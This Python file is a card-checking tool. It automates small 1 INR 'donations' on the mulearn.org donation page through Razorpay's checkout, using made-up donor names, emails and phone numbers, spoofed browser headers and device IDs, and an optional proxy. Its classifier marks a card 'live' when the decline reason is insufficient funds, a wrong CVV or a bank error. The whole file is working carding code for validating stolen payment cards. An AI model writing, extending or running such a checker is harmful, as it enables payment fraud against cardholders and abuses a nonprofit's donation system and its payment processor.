"""
Razorpay Payment Gateway - mulearn.org flow (working implementation).
Uses shared httpx.AsyncClient for cookie/state persistence across requests.
"""

import asyncio
import hashlib
import json
import random
import re
import secrets
import string
import time
from typing import Dict, Any, Optional
from datetime import datetime
import httpx


class _ClientCtx:
    def __init__(self, proxy=None):
        self._proxy = proxy
    async def __aenter__(self):
        limits = httpx.Limits(max_connections=50, max_keepalive_connections=20)
        self._client = httpx.AsyncClient(timeout=25.0, proxy=self._proxy, follow_redirects=True, limits=limits)
        return self._client
    async def __aexit__(self, *args):
        pass

class RazorpayGateway:
    name = "razorpay"
    display_name = "Razorpay"

    supported_cards = ["visa", "mastercard", "amex", "jcb", "rupay"]
    supported_currencies = ["INR"]

    KEY = "rzp_live_L7WH1wzlF4Jn4x"
    BUILD = "c754096205a48a33d3633b3023c94000971ba8d7"
    BUILD_V1 = "da4ee3f43a28ad81dba8ed06daf899a4520c691f"
    RISK_TOKEN = "W3sibmFtZSI6InNhcmRpbmUiLCJtZXRhZGF0YSI6eyJzZXNzaW9uX2lkIjoiU3ZQOENhVE1Nd0ZUYUQifX1d"

    UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"

    DEAD_CODES = frozenset({
        "card_not_enrolled", "payment_risk_check_failed", "card_declined", "declined",
        "invalid_card_number", "card_expired", "expired_card", "authentication_failed",
        "payment_cancelled", "payment_failed", "card_disabled", "lost_card", "stolen_card",
    })

    _FIRST = ("James", "John", "Robert", "Michael", "David", "Sarah", "Emma", "Olivia")
    _LAST = ("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis")

    @classmethod
    def _fake_name(cls) -> str:
        return f"{random.choice(cls._FIRST)} {random.choice(cls._LAST)}"

    @classmethod
    def _fake_email(cls) -> str:
        return f"{random.choice(cls._FIRST).lower()}{random.randint(10, 9999)}@gmail.com"

    @classmethod
    def _fake_phone(cls) -> str:
        return "+91" + "".join(str(random.randint(0, 9)) for _ in range(10))

    @classmethod
    def _gen_device_id(cls) -> str:
        h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
        ts = str(int(time.time() * 1000))
        rnd = str(random.randrange(10**8)).zfill(8)
        return f"1.{h}.{ts}.{rnd}"

    @classmethod
    def _gen_session_id(cls, length: int = 14) -> str:
        return "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))

    @classmethod
    def _classify(cls, desc: str, reason: str) -> Dict:
        code = (reason or "").strip().lower()
        lower = desc.lower()

        if code in cls.DEAD_CODES:
            return {"status": "dead", "approved": False, "message": desc, "code": code}
        if any(k in lower for k in ("insufficient", "maximum transaction limit")):
            return {"status": "live", "approved": True, "message": desc, "code": code}
        if any(k in lower for k in ("cvv", "incorrect_cvv")):
            return {"status": "live", "approved": True, "message": desc, "code": code}
        if code in ("bank_technical_error", "issuer_bank_unavailable", "gateway_error", "payment_processing_failed"):
            return {"status": "live", "approved": True, "message": desc, "code": code}
        return {"status": "dead", "approved": False, "message": desc, "code": code}

    @classmethod
    async def process(
        cls,
        card_number: str,
        exp_month: int,
        exp_year: int,
        cvv: str,
        amount: float = 1.0,
        currency: str = "INR",
        **kwargs
    ) -> Dict[str, Any]:
        proxy = kwargs.get("proxy")
        t0 = time.time()
        try:
            card_type = cls._detect_card_type(card_number)
            if card_type not in cls.supported_cards:
                return {"status": "error", "success": False, "message": f"Razorpay does not support {card_type}", "gateway": cls.name}

            if exp_year > 99:
                exp_year = exp_year % 100

            cc = card_number.replace(" ", "").replace("-", "")
            mm = str(exp_month).zfill(2)
            yy = str(exp_year)[-2:]
            name = cls._fake_name()
            email = cls._fake_email()
            phone = cls._fake_phone()
            pan = "ABCDE1234F"

            device_id = cls._gen_device_id()
            rtb_id = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
            unified_session_id = cls._gen_session_id()
            order_amount = int(amount)
            payment_amount_paise = str(order_amount * 100)

            async with _ClientCtx(proxy) as client:
                # Step 1: Create order via mulearn.org
                order_hdrs = {
                    "Host": "mulearn.org",
                    "Cookie": f"rzp_unified_session_id={unified_session_id}",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept": "application/json, text/plain, */*",
                    "Content-Type": "application/json",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "User-Agent": cls.UA,
                    "Origin": "https://mulearn.org",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://mulearn.org/donate",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=1, i",
                    "Connection": "keep-alive",
                }
                order_body = {
                    "amount": order_amount,
                    "currency": "INR",
                    "name": name,
                    "donation_name": "",
                    "email": email,
                    "phone_number": phone,
                    "pan_number": pan,
                    "address": "32st India",
                    "donation_type": "one-time",
                    "is_organisation": False,
                }
                order_resp = await client.post(
                    "https://mulearn.org/api/v1/donate/order/",
                    headers=order_hdrs, json=order_body,
                )
                if order_resp.status_code != 200:
                    return {"status": "error", "success": False, "message": f"Order creation failed: {order_resp.status_code}", "gateway": cls.name}

                order_payload = order_resp.json()
                if "response" not in order_payload or "id" not in order_payload.get("response", {}):
                    return {"status": "error", "success": False, "message": "Order creation failed - invalid response", "gateway": cls.name}

                order_id = order_payload["response"]["id"]
                checkout_id = order_id.split("_")[1]

                # Step 2: Get session token (no rzp_device_id in params, matching working code)
                sess_hdrs = {
                    "Host": "api.razorpay.com",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": cls.UA,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Sec-Fetch-Site": "cross-site",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Dest": "iframe",
                    "Sec-Fetch-Storage-Access": "active",
                    "Referer": "https://mulearn.org/",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=0, i",
                    "Connection": "keep-alive",
                }
                sess_resp = await client.get(
                    "https://api.razorpay.com/v1/checkout/public",
                    params={
                        "traffic_env": "production", "build": cls.BUILD, "build_v1": cls.BUILD_V1,
                        "checkout_v2": "1", "new_session": "1",
                        "unified_session_id": unified_session_id,
                    },
                    headers=sess_hdrs,
                )
                mx = re.search(r'window\.session_token\s*=\s*"([^"]+)"', sess_resp.text)
                if not mx:
                    return {"status": "error", "success": False, "message": "Session token not found", "gateway": cls.name}
                sessid = mx.group(1)

                # Step 3: Get shield context
                ref_url = (
                    f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
                    f"&build={cls.BUILD}&build_v1={cls.BUILD_V1}&checkout_v2=1&new_session=1"
                    f"&rzp_device_id={device_id}&unified_session_id={unified_session_id}"
                    f"&session_token={sessid}"
                )
                shield_hdrs = {
                    "Host": "api.razorpay.com",
                    "X-Session-Token": sessid,
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/json",
                    "Sec-Ch-Ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Storage-Access": "active",
                    "Origin": "https://api.razorpay.com",
                    "Referer": ref_url,
                    "User-Agent": cls.UA,
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=1, i",
                    "Connection": "keep-alive",
                }
                prefs_body = {
                    "query": [
                        {"resource": "checkout_version_config"}, {"resource": "merchant"},
                        {"resource": "merchant_features"}, {"resource": "downtime"},
                        {"resource": "customer"}, {"resource": "customer_tokens"},
                        {"resource": "truecaller"}, {"resource": "methods"},
                        {"resource": "experiments"}, {"resource": "offers"},
                        {"resource": "checkout_config"}, {"resource": "order"},
                        {"resource": "invoice"}, {"resource": "buyer_protection"},
                        {"resource": "ads_slot_config"}, {"resource": "intl_config"},
                    ],
                    "query_params": {
                        "device_id": device_id, "rtb_device_id": rtb_id,
                        "amount": order_amount, "currency": "INR", "option_currency": "INR",
                        "truecaller": False, "qr_required": True,
                        "checkout_id": checkout_id, "library": "checkoutjs",
                        "platform": "browser", "referrer_domain": "mulearn.org",
                        "device_type": "desktop", "order_id": order_id,
                    },
                    "action": "get",
                }
                prefs_resp = await client.post(
                    f"https://api.razorpay.com/v2/standard_checkout/preferences?key_id={cls.KEY}&session_token={sessid}",
                    headers=shield_hdrs, json=prefs_body,
                )
                if prefs_resp.status_code != 200:
                    return {"status": "error", "success": False, "message": f"Preferences failed: {prefs_resp.status_code}", "gateway": cls.name}
                prefs = prefs_resp.json()
                shield_data = prefs.get("shield_data", {})
                shield_context = shield_data.get("shield_context", "")
                shield_fhash = shield_data.get("shield_key", "")

                # Step 4: Create payment method
                ajax_hdrs = {
                    "Host": "api.razorpay.com",
                    "X-Session-Token": sessid,
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Sec-Ch-Ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Storage-Access": "active",
                    "Origin": "https://api.razorpay.com",
                    "Referer": ref_url,
                    "User-Agent": cls.UA,
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Priority": "u=1, i",
                    "Connection": "keep-alive",
                }
                ajax_data = {
                    "description": "Donation - One-time",
                    "notes[donation_type]": "one-time",
                    "notes[is_organisation]": "false",
                    "notes[organisation_name]": "N/A",
                    "key_id": cls.KEY,
                    "contact": phone,
                    "email": email,
                    "currency": "INR",
                    "_[checkout_id]": checkout_id,
                    "_[device.id]": device_id,
                    "_[library]": "checkoutjs",
                    "_[library_src]": "no-src",
                    "_[current_script_src]": "no-src",
                    "_[platform]": "browser",
                    "_[env]": "",
                    "_[is_magic_script]": "false",
                    "_[os]": "linux",
                    "_[referer]": "https://mulearn.org/donate",
                    "_[shield][fhash]": shield_fhash,
                    "_[shield][tz]": "330",
                    "_[device_id]": device_id,
                    "_[build]": "26589118452",
                    "_[request_index]": "1",
                    "amount": payment_amount_paise,
                    "order_id": order_id,
                    "method": "card",
                    "card[number]": cc,
                    "card[cvv]": cvv,
                    "card[name]": name,
                    "card[expiry_month]": mm,
                    "card[expiry_year]": yy,
                    "save": "0",
                    "user_risk_providers_token": cls.RISK_TOKEN,
                }
                if shield_context:
                    ajax_data["_[shield_context]"] = shield_context

                pay_resp = await client.post(
                    f"https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={cls.KEY}&session_token={sessid}",
                    headers=ajax_hdrs, data=ajax_data,
                )
                pay = pay_resp.json()

                payment_id = pay.get("payment_id") or pay.get("id")
                if not payment_id:
                    err = pay.get("error", {})
                    result = cls._classify(err.get("description", ""), err.get("reason") or err.get("code", ""))
                    result["time"] = round(time.time() - t0, 2)
                    result["gateway"] = cls.name
                    result["card_type"] = card_type
                    result["card_last4"] = card_number[-4:]
                    result["success"] = result["status"] in ("charged", "live")
                    result["timestamp"] = datetime.now().isoformat()
                    return result

                # Step 5: Authenticate (3DS2)
                pid_clean = payment_id.split("_")[1]
                h3ds = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": cls.UA}

                try:
                    await client.post(
                        f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
                        headers={**h3ds, "Origin": "https://api.razorpay.com", "Referer": ref_url},
                    )
                except Exception:
                    pass

                await asyncio.sleep(1)

                try:
                    await client.post(
                        f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
                        headers={**h3ds, "Origin": "https://api.razorpay.com", "Referer": ref_url},
                        data={
                            "browser[java_enabled]": "false", "browser[javascript_enabled]": "true",
                            "browser[timezone_offset]": "0", "browser[color_depth]": "24",
                            "browser[screen_width]": "1920", "browser[screen_height]": "1080",
                            "browser[language]": "en-US", "auth_step": "3ds2Auth",
                        },
                    )
                except Exception:
                    pass

                # Step 6: Check final status
                final_resp = await client.get(
                    f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel",
                    params={"key_id": cls.KEY, "session_token": sessid},
                    headers={**ajax_hdrs, "Content-Type": "application/x-www-form-urlencoded"},
                )
                final_text = final_resp.text
                elapsed = round(time.time() - t0, 2)

                if "razorpay_payment_id" in final_text:
                    return {
                        "status": "charged", "success": True, "message": "Charged 1 INR",
                        "payment_id": payment_id, "gateway": cls.name,
                        "card_type": card_type, "card_last4": card_number[-4:],
                        "amount": float(order_amount) / 100 if order_amount else 1.0,
                        "time": elapsed, "timestamp": datetime.now().isoformat()
                    }

                try:
                    final = final_resp.json()
                except Exception:
                    final = {}

                err = final.get("error", {})
                result = cls._classify(err.get("description", ""), err.get("reason") or err.get("code", ""))
                result["payment_id"] = payment_id
                result["time"] = elapsed
                result["gateway"] = cls.name
                result["card_type"] = card_type
                result["card_last4"] = card_number[-4:]
                result["success"] = result["status"] in ("charged", "live")
                result["timestamp"] = datetime.now().isoformat()
                return result

        except Exception as e:
            return {
                "status": "error", "success": False,
                "message": f"Razorpay error: {str(e)}",
                "gateway": cls.name, "card_type": "unknown", "card_last4": "",
                "time": round(time.time() - t0, 2), "timestamp": datetime.now().isoformat()
            }

    @classmethod
    def _detect_card_type(cls, card_number: str) -> str:
        card_number = card_number.replace(" ", "").replace("-", "")
        if card_number.startswith("4"):
            return "visa"
        elif card_number.startswith(("51", "52", "53", "54", "55")):
            return "mastercard"
        elif card_number.startswith(("34", "37")):
            return "amex"
        elif card_number.startswith("35"):
            return "jcb"
        elif card_number.startswith("6"):
            return "rupay"
        return "unknown"

    @classmethod
    async def test_connection(cls) -> Dict:
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                resp = await client.get("https://mulearn.org/donate")
                return {"success": resp.status_code == 200, "gateway": cls.name, "message": "Razorpay reachable", "status": "online"}
        except Exception as e:
            return {"success": False, "gateway": cls.name, "message": str(e), "status": "offline"}
